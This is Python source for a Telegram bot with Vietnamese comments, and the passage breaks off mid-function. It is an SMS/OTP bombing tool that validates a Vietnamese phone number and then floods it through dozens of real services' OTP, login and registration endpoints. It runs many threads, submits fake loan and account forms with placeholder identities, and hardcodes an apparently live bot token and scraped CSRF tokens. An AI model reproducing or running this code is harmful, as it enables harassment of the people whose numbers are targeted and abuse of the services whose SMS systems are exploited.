import os
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Dict, List
import re

import telebot
from telebot.types import Message
from flask import Flask
import requests
try:
    import psutil
except ImportError:
    psutil = None

# CONFIG - ĐIỀU CHỈNH CHO PHÙ HỢP VỚI MÁY TÍNH
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8669337116:AAGo6urkWzXSb0vWUWlpVytf2DJiF932pYI')
if not TOKEN or ':' not in TOKEN:
    raise ValueError("Thieu hoac sai TELEGRAM_BOT_TOKEN")

bot = telebot.TeleBot(TOKEN)

# TỐI ƯU CHO MÁY TÍNH CÁ NHÂN
MAX_CONCURRENT_TARGETS = 100    # Giới hạn số job đồng thời
MAX_THREADS_PER_TARGET = 50     # Số thread cho mỗi job
BATCH_SIZE = 20                  # Số lượng gửi trong mỗi batch
DELAY_BETWEEN_ROUNDS_SEC = (2, 4)  # Delay giữa các vòng
REQUEST_TIMEOUT = 10             # Timeout cho mỗi request

# ADMIN CONFIG
ADMIN_IDS = [6630785148]          # THAY ID TELEGRAM CỦA ADMIN VÀO ĐÂY
VIP_FILE = "vips.txt"
USERS_FILE = "users.txt"
VIP_ONLY_MODE = False

# HÀM LOAD/SAVE VIP & USERS
def load_list(filename):
    if not os.path.exists(filename):
        return set()
    with open(filename, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_list(filename, data_set):
    with open(filename, "w") as f:
        for item in data_set:
            f.write(f"{item}\n")

vips_list = load_list(VIP_FILE)
users_list = load_list(USERS_FILE)

def add_user(user_id):
    user_id_str = str(user_id)
    if user_id_str not in users_list:
        users_list.add(user_id_str)
        save_list(USERS_FILE, users_list)

# Cache sessions để tái sử dụng
session_cache = {}
active_jobs = {}
jobs_lock = threading.Lock()

# KIEM TRA SO DIEN THOAI VN
PHONE_PATTERN = re.compile(r'^0(3[2-9]|5[689]|7[06-9]|8[1-689]|9[0-9])[0-9]{7}$')
def is_valid_vn_phone(phone: str) -> bool:
    phone = re.sub(r'[\s\-\+]', '', phone)
    if phone.startswith('+84'):
        phone = '0' + phone[3:]
    return bool(PHONE_PATTERN.match(phone)) if phone.startswith('0') else False

# GET SESSION CHO MỖI THREAD
def get_session():
    thread_id = threading.get_ident()
    if thread_id not in session_cache:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive'
        })
        # Tối ưu connection pool
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=1,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session_cache[thread_id] = session
    return session_cache[thread_id]

# TẤT CẢ CÁC HÀM GỬI OTP
def send_otp_via_sapo(phone: str):
    try:
        session = get_session()
        data = {'phonenumber': phone}
        session.post('https://www.sapo.vn/fnb/sendotp', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_viettel(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone, 'typeCode': 'DI_DONG', 'type': 'otp_login'}
        session.post('https://viettel.vn/api/getOTPLoginCommon', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_medicare(phone: str):
    try:
        session = get_session()
        json_data = {'mobile': phone, 'mobile_country_prefix': '84'}
        session.post('https://medicare.vn/api/otp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_tv360(phone: str):
    try:
        session = get_session()
        json_data = {'msisdn': phone}
        session.post('https://tv360.vn/public/v1/auth/get-otp-login', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_dienmayxanh(phone: str):
    try:
        session = get_session()
        data = {
            'phoneNumber': phone,
            'isReSend': 'false',
            'sendOTPType': '1',
            '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU',
        }
        session.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_kingfoodmart(phone: str):
    try:
        session = get_session()
        json_data = {
            'operationName': 'SendOtp',
            'variables': {
                'input': {
                    'phone': phone,
                    'captchaSignature': 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
                },
            },
            'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
        }
        session.post('https://api.onelife.vn/v1/gateway/', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_mocha(phone: str):
    try:
        session = get_session()
        params = {
            'msisdn': phone,
            'languageCode': 'vi',
        }
        session.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_fptdk(phone: str):
    try:
        session = get_session()
        json_data = {
            'phone': phone,
            'country_code': 'VN',
            'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
        }
        session.post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&amp;e=1722340953&amp;device=Microsoft%20Edge(version%253A127.0.0.0)&amp;drm=1', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_fptmk(phone: str):
    try:
        session = get_session()
        json_data = {
            'phone': phone,
            'country_code': 'VN',
            'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
        }
        session.post('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&amp;e=1722365955&amp;device=Microsoft%20Edge(version%253A127.0.0.0)&amp;drm=1', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_VIEON(phone: str):
    try:
        session = get_session()
        params = {
            'platform': 'web',
            'ui': '012021',
        }
        json_data = {
            'username': phone,
            'country_code': 'VN',
            'model': 'Windows 10',
            'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
            'device_name': 'Edge/127',
            'device_type': 'desktop',
            'platform': 'web',
            'ui': '012021',
        }
        session.post('https://api.vieon.vn/backend/user/v2/register', params=params, json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_ghn(phone: str):
    try:
        session = get_session()
        json_data = {
            'phone': phone,
            'type': 'register',
        }
        session.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_lottemart(phone: str):
    try:
        session = get_session()
        json_data = {
            'username': phone,
            'case': 'register',
        }
        session.post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_DONGCRE(phone: str):
    try:
        session = get_session()
        json_data = {
            'login': phone,
            'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        }
        session.post('https://api.vayvnd.vn/v2/users/password-reset', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_shopee(phone: str):
    try:
        session = get_session()
        json_data = {
            'operation': 8,
            'encrypted_phone': '',
            'phone': phone,
            'supported_channels': [1, 2, 3, 6, 0, 5],
            'support_session': True,
        }
        session.post('https://shopee.vn/api/v4/otp/get_settings_v2', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_TGDD(phone: str):
    try:
        session = get_session()
        data = {
            'phoneNumber': phone,
            'isReSend': 'false',
            'sendOTPType': '1',
            '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs',
        }
        session.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_fptshop(phone: str):
    try:
        session = get_session()
        json_data = {
            'fromSys': 'WEBKHICT',
            'otpType': '0',
            'phoneNumber': phone,
        }
        session.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_WinMart(phone: str):
    try:
        session = get_session()
        json_data = {
            'firstName': 'Nguyen Van A',
            'phoneNumber': phone,
            'masanReferralCode': '',
            'dobDate': '2024-07-26',
            'gender': 'Male',
        }
        session.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vietloan(phone: str):
    try:
        session = get_session()
        data = {
            'phone': phone,
            '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi',
        }
        session.post('https://vietloan.vn/register/phone-resend', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_lozi(phone: str):
    try:
        session = get_session()
        json_data = {
            'countryCode': '84',
            'phoneNumber': phone,
        }
        session.post('https://mocha.lozi.vn/v1/invites/use-app', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_F88(phone: str):
    try:
        session = get_session()
        json_data = {
            'FullName': 'Nguyen Van A',
            'Phone': phone,
            'DistrictCode': '024',
            'ProvinceCode': '02',
            'AssetType': 'Car',
            'IsChoose': '1',
            'ShopCode': '',
            'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
            'FormType': 1,
        }
        session.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_spacet(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone}
        session.post('https://api.spacet.vn/www/user/phone', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vinpearl(phone: str):
    try:
        session = get_session()
        json_data = {
            'channel': 'vpt',
            'username': phone,
            'type': 1,
            'OtpChannel': 1,
        }
        session.post('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_traveloka(phone: str):
    try:
        session = get_session()
        if phone.startswith('09'):
            phone = '+84' + phone[1:]
        json_data = {
            'fields': [],
            'data': {
                'userLoginMethod': 'PN',
                'username': phone,
            },
            'clientInterface': 'desktop',
        }
        session.post('https://www.traveloka.com/api/v2/user/signup', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_dongplus(phone: str):
    try:
        session = get_session()
        json_data = {'mobile_phone': phone}
        session.post('https://api.dongplus.vn/api/v2/user/check-phone', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_longchau(phone: str):
    try:
        session = get_session()
        json_data = {
            'phoneNumber': phone,
            'otpType': 0,
            'fromSys': 'WEBKHLC',
        }
        session.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_longchau1(phone: str):
    try:
        session = get_session()
        json_data = {
            'phoneNumber': phone,
            'otpType': 1,
            'fromSys': 'WEBKHLC',
        }
        session.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_galaxyplay(phone: str):
    try:
        session = get_session()
        params = {'phone': phone}
        session.post('https://api.glxplay.io/account/phone/verify', params=params, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_emartmall(phone: str):
    try:
        session = get_session()
        data = {'mobile': phone}
        session.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_ahamove(phone: str):
    try:
        session = get_session()
        json_data = {
            'mobile': phone,
            'country_code': 'VN',
            'firebase_sms_auth': True,
        }
        session.post('https://api.ahamove.com/api/v3/public/user/login', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_ViettelMoney(phone: str):
    try:
        session = get_session()
        payload = {
            "identityType": "msisdn",
            "identityValue": phone,
            "type": "REGISTER"
        }
        session.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=payload, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_xanhsmsms(phone: str):
    try:
        session = get_session()
        if phone.startswith('09') or phone.startswith('03'):
            phone = '+84' + phone[1:]
        params = {'aud': "user_app", 'platform': "ios"}
        payload = {"is_forgot_password": False, "phone": phone, "provider": "VIET_GUYS"}
        session.post("https://api.gsm-api.net/auth/v1/public/otp/send", params=params, json=payload, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_xanhsmzalo(phone: str):
    try:
        session = get_session()
        if phone.startswith('09') or phone.startswith('03'):
            phone = '+84' + phone[1:]
        params = {'platform': "ios", 'aud': "user_app"}
        payload = {"phone": phone, "is_forgot_password": False, "provider": "ZNS_ZALO"}
        session.post("https://api.gsm-api.net/auth/v1/public/otp/send", params=params, json=payload, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_popeyes(phone: str):
    try:
        session = get_session()
        json_data = {
            'phone': phone,
            'firstName': 'Nguyen',
            'lastName': 'Van A',
            'email': 'test@gmail.com',
            'password': 'Password123!',
        }
        session.post('https://api.popeyes.vn/api/v1/register', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_ACHECKIN(phone: str):
    try:
        session = get_session()
        payload3 = {
            "operationName": "RequestVoiceOTP",
            "variables": {
                "phone_number": phone,
                "action": "REGISTER",
                "hash": "6af5e4ed78ee57fe21f0d405c752798f"
            },
            "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
        }
        session.post("https://id.acheckin.vn/api/graphql/v2/mobile", json=payload3, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_APPOTA(phone: str):
    try:
        session = get_session()
        payload3 = {
            "phone_number": phone,
            "sender": "SMS",
            "ts": 1722417441,
            "signature": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
        }
        session.post("https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code", json=payload3, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_Watsons(phone: str):
    try:
        session = get_session()
        params = {'lang': "vi"}
        payload = {
            "otpTokenRequest": {
                "action": "REGISTRATION",
                "type": "SMS",
                "countryCode": "84",
                "target": phone
            },
            "defaultAddress": {
                "mobileNumberCountryCode": "84",
                "mobileNumber": phone
            },
            "mobileNumber": phone
        }
        session.post("https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep", params=params, json=payload, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_hoangphuc(phone: str):
    try:
        session = get_session()
        data = {
            'action_type': '1',
            'tel': phone,
        }
        session.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_fmcomvn(phone: str):
    try:
        session = get_session()
        json_data = {
            'Phone': phone,
            'LatOfMap': '106',
            'LongOfMap': '108',
            'Browser': '',
        }
        session.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_Reebokvn(phone: str):
    try:
        session = get_session()
        json_data = {'phoneNumber': phone}
        session.post('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_thefaceshop(phone: str):
    try:
        session = get_session()
        json_data = {'phoneNumber': phone}
        session.post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_BEAUTYBOX(phone: str):
    try:
        session = get_session()
        json_data = {'phoneNumber': phone}
        session.post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_futabus(phone: str):
    try:
        session = get_session()
        json_data = {
            'phoneNumber': phone,
            'deviceId': 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
            'use_for': 'LOGIN',
        }
        session.post('https://api.vato.vn/api/authenticate/request_code', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_ViettelPost(phone: str):
    try:
        session = get_session()
        data = {
            'FormRegister.FullName': 'Nguyen Van A',
            'FormRegister.Phone': phone,
            'FormRegister.Password': 'Password123@',
            'FormRegister.ConfirmPassword': 'Password123@',
            'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&amp;secret=vtp-web&amp;scope=openid%20profile%20se-public-api%20offline_access&amp;response_type=id_token%20token&amp;state=abc&amp;redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&amp;nonce=3r25st1hpummjj42ig7zmt',
            'ConfirmOtpType': 'Register',
            'FormRegister.IsRegisterFromPhone': 'true',
            '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
        }
        session.post('https://id.viettelpost.vn/Account/SendOTPByPhone', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_myviettel2(phone: str):
    try:
        session = get_session()
        json_data = {
            'msisdn': phone,
            'type': 'register',
        }
        session.post('https://viettel.vn/api/get-otp-contract-mobile', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_myviettel3(phone: str):
    try:
        session = get_session()
        json_data = {'msisdn': phone}
        session.post('https://viettel.vn/api/get-otp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_TOKYOLIFE(phone: str):
    try:
        session = get_session()
        json_data = {
            'phone_number': phone,
            'name': 'Nguyen Van A',
            'password': 'Password123@',
            'email': 'test@gmail.com',
            'birthday': '2000-01-01',
            'gender': 'male',
        }
        session.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_30shine(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone}
        session.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_Cathaylife(phone: str):
    try:
        session = get_session()
        data = {
            'memberMap': f'{{"userName":"test@gmail.com","password":"Password123@","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{phone}","email":"test@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyen Van A"}}',
            'OTP_TYPE': 'P',
            'LANGS': 'vi_VN',
        }
        session.post('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_dominos(phone: str):
    try:
        session = get_session()
        json_data = {
            'phone_number': phone,
            'email': 'test@gmail.com',
            'type': 0,
            'is_register': True,
        }
        session.post('https://dominos.vn/api/v1/users/send-otp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vinamilk(phone: str):
    try:
        session = get_session()
        data = f'{{"type":"register","phone":"{phone}"}}'
        session.post('https://new.vinamilk.com.vn/api/account/getotp', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_batdongsan(phone: str):
    try:
        session = get_session()
        params = {'phoneNumber': phone}
        session.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_GUMAC(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone}
        session.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_mutosi(phone: str):
    try:
        session = get_session()
        json_data = {
            'name': 'Nguyen Van A',
            'phone': phone,
            'password': 'Password123@',
            'confirm_password': 'Password123@',
            'firstname': None,
            'lastname': None,
            'verify_otp': 0,
            'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
            'email': 'test@gmail.com',
            'birthday': '2000-01-01',
            'accept_the_terms': 1,
            'receive_promotion': 1,
        }
        session.post('https://api-omni.mutosi.com/client/auth/register', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vietair(phone: str):
    try:
        session = get_session()
        data = {
            'op': 'PACKAGE_HTTP_POST',
            'path_ajax_post': '/service03/sms/get',
            'package_name': 'PK_FD_SMS_OTP',
            'object_name': 'INS',
            'P_MOBILE': phone,
            'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
        }
        session.post('https://vietair.com.vn/Handler/CoreHandler.ashx', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_FAHASA(phone: str):
    try:
        session = get_session()
        data = {'phone': phone}
        session.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_hopiness(phone: str):
    try:
        session = get_session()
        data = {
            'action': 'verify-registration-info',
            'phoneNumber': phone,
            'refCode': '',
        }
        session.post('https://shopiness.vn/ajax/user', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_modcha35(phone: str):
    try:
        session = get_session()
        payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={phone}&version=1.28"
        session.post("https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32", data=payload, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_Bibabo(phone: str):
    try:
        session = get_session()
        params = {
            'phone': phone,
            'reCaptchaToken': "undefined",
            'appId': "7",
            'version': "2"
        }
        session.get("https://one.bibabo.vn/api/v1/login/otp/createOtp", params=params, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_MOCA(phone: str):
    try:
        session = get_session()
        params = {'phoneNumber': phone}
        session.get("https://moca.vn/moca/v2/users/role", params=params, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_pantio(phone: str):
    try:
        session = get_session()
        params = {'domain': 'pantiofashion.myharavan.com'}
        data = {'phoneNumber': phone}
        session.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_Routine(phone: str):
    try:
        session = get_session()
        data = {
            'telephone': phone,
            'isForgotPassword': '0',
        }
        session.post('https://routine.vn/customer/otp/send/', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vayvnd(phone: str):
    try:
        session = get_session()
        json_data = {
            'login': phone,
            'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        }
        session.post('https://api.vayvnd.vn/v2/users/password-reset', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_tima(phone: str):
    try:
        session = get_session()
        data = {
            'application_full_name': 'Nguyen Van A',
            'application_mobile_phone': phone,
            'CityId': '1',
            'DistrictId': '16',
            'rules': 'true',
            'TypeTime': '1',
            'application_amount': '0',
            'application_term': '0',
            'UsertAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'IsApply': '1',
            'ProvinceName': 'Ha Noi',
            'DistrictName': 'Soc Son',
            'product_id': '2',
        }
        session.post('https://tima.vn/Borrower/RegisterLoanCreditFast', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_moneygo(phone: str):
    try:
        session = get_session()
        data = {
            '_token': 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV',
            'total': '56688000',
            'phone': phone,
            'agree': '1',
        }
        session.post('https://moneygo.vn/dang-ki-vay-nhanh', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_pico(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone}
        session.post('https://auth.pico.vn/user/api/auth/login/request-otp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_PNJ(phone: str):
    try:
        session = get_session()
        data = {
            '_method': 'POST',
            '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
            'type': 'zns',
            'phone': phone,
        }
        session.post('https://www.pnj.com.vn/customer/otp/request', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_TINIWORLD(phone: str):
    try:
        session = get_session()
        data = {
            '_csrf': '',
            'clientId': '609168b9f8d5275ea1e262d6',
            'redirectUrl': 'https://tiniworld.com',
            'phone': phone,
        }
        session.post('https://prod-tini-id.nkidworks.com/auth/tinizen', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_takomo(phone: str):
    try:
        session = get_session()
        json_data = {"data": {"phone": phone, "code": "resend", "channel": "ivr"}}
        session.post('https://lk.takomo.vn/api/4/client/otp/send', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_paynet(phone: str):
    try:
        session = get_session()
        data = {
            'MobileNumber': phone,
            'IsForget': 'N',
        }
        session.post('https://merchant.paynetone.vn/User/GetOTP', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_trungsoncare(phone: str):
    try:
        session = get_session()
        data = {
            'func': 'getotp',
            'user_type': 'sms',
            'read_policy': '1',
            'ip_code': '84',
            'user_login': phone,
        }
        session.post('https://trungsoncare.com/index.php', params={'dispatch': 'loginbyOTP'}, data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_fptid(phone: str):
    try:
        session = get_session()
        json_data = {
            'Username': phone,
            'Challenge': 'd3aa9e431d504ee28d2b3bec42460b5a',
        }
        session.post('https://accounts.fpt.vn/sso/partial/username', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vinid(phone: str):
    try:
        session = get_session()
        phone_formatted = '+84' + phone[1:] if phone.startswith('0') else phone
        json_data = {
            'phone_number': phone_formatted,
            'is_register': False,
        }
        headers = {
            'x-channel': 'zUsirVWzboWdAMi',
            'x-request-id': 'e3adcdb3-bb9c-47f4-8fd8-4dc5772857a4',
        }
        session.post('https://apex.vinid.net/oneid/iam/v1/otp/sms/request', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_hasaki(phone: str):
    try:
        session = get_session()
        params = {
            'api': 'user.verifyUserName',
            'username': phone,
        }
        session.get('https://hasaki.vn/ajax', params=params, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vuihoc(phone: str):
    try:
        session = get_session()
        json_data = {
            'mobile': phone,
            'agent_type': 'web',
            'app_id': 2,
            'type': 0,
        }
        headers = {
            'app-id': '2',
            'authorization': 'Bearer',
            'send-from': 'WEB',
        }
        session.post('https://api.vuihoc.vn/api/v2.1/send-otp', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_best_inc(phone: str):
    try:
        session = get_session()
        json_data = {
            'phoneNumber': phone,
            'verificationCodeType': 1,
        }
        headers = {
            'authorization': 'null',
            'lang-type': 'vi-VN',
            'x-auth-type': 'WEB',
            'x-lan': 'VI',
            'x-nat': 'vi-VN',
            'x-timezone-offset': '7',
        }
        session.post('https://v9-cc.800best.com/uc/account/sendsignupcode', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vndirect(phone: str):
    try:
        session = get_session()
        params = {
            'template': 'sms_otp_trading_vi',
            'send': phone,
            'type': 'PHONE',
        }
        session.get('https://id.vndirect.com.vn/authentication/otp/', params=params, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_guardian(phone: str):
    try:
        session = get_session()
        json_data = {'telephone': phone}
        session.post('https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_jollibee(phone: str):
    try:
        session = get_session()
        data = {
            'success_url': '',
            'error_url': '',
            'lastname': 'Nguyen',
            'firstname': 'Van A',
            'phone': phone,
            'email': '',
            'password': 'Password123@',
            'password_confirmation': 'Password123@',
            'dob': '01/01/2000',
            'gender': '1',
